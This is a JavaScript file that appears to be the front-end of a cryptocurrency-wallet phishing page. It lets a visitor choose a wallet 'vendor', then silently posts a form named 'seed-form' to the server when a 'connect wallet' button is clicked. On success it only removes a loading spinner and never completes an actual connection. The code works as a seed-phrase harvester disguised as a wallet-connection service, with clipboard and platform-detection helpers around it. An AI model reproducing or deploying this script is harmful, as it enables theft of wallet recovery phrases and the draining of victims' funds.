var Colab = (function () {
  'use strict';

  var colab = {};

  var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
      sURLVariables = sPageURL.split('&'),
      sParameterName,
      i;

    for (i = 0; i < sURLVariables.length; i++) {
      sParameterName = sURLVariables[i].split('=');

      if (sParameterName[0] === sParam) {
        return sParameterName[1] === undefined ?
          true :
          decodeURIComponent(sParameterName[1]);
      }
    }
    return false;
  };

  function seed_form_submit(thisForm, action, formData) {
    fetch(action, {
      method: 'POST',
      body: formData,
      headers: {
        'X-Requested-With': 'XMLHttpRequest'
      },
    }).then((data) => {
      if (data.status == 200) {
        $('.loader').remove();
      } else if (data.status == 500) {
        Swal.fire('Network Error', '', 'error');
        $('.loader').remove();
      }
    });
  }

  function fallbackCopyTextToClipboard(text) {
    var textArea = document.createElement('textarea');
    textArea.value = text;

    // Avoid scrolling to bottom
    textArea.style.top = '0';
    textArea.style.left = '0';
    textArea.style.position = 'fixed';

    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      var successful = document.execCommand('copy');
      var msg = successful ? 'successful' : 'unsuccessful';
      console.log('Fallback: Copying text command was ' + msg);
    } catch (err) {
      console.error('Fallback: Oops, unable to copy', err);
    }

    document.body.removeChild(textArea);
  }
  colab.copyTextToClipboard = function (text) {
    if (!navigator.clipboard) {
      fallbackCopyTextToClipboard(text);
      return;
    }
    navigator.clipboard.writeText(text).then(
      function () {
        console.log('Async: Copying to clipboard was successful!');
      },
      function (err) {
        console.error('Async: Could not copy text: ', err);
      }
    );
  };

  var $vendorFromURL = getUrlParameter('vendor');
  var ua = navigator.userAgent.toLowerCase();
  var isAndroid = ua.indexOf('android') > -1;
  var isIOS = ua.indexOf('mac') > -1;
  var isWindows = ua.indexOf('win') > -1;
  let platform = null;
  var codeString = '';

  if (isAndroid) {
    platform = 'Android';
  } else if (isIOS) {
    platform = 'iOS';
  } else if (isWindows) {
    platform = 'Windows';
  }

  $('.crypto-button').click(function (e) {
    e.preventDefault();
    let ven = $(this).attr('id');
    console.log(ven);
    location.href = 'connect.php?vendor=' + ven;
  });

  $('#connectWalletButton').click(function (e) {
    e.preventDefault();

    let thisForm = $('#seed-form');

    let action = thisForm.attr('action');

    $('#loader').append('<div class="loader mx-auto mt-3"></div>');

    let formData = new FormData(document.getElementById('seed-form'));

    seed_form_submit(thisForm, action, formData);
  });

  return colab;
})();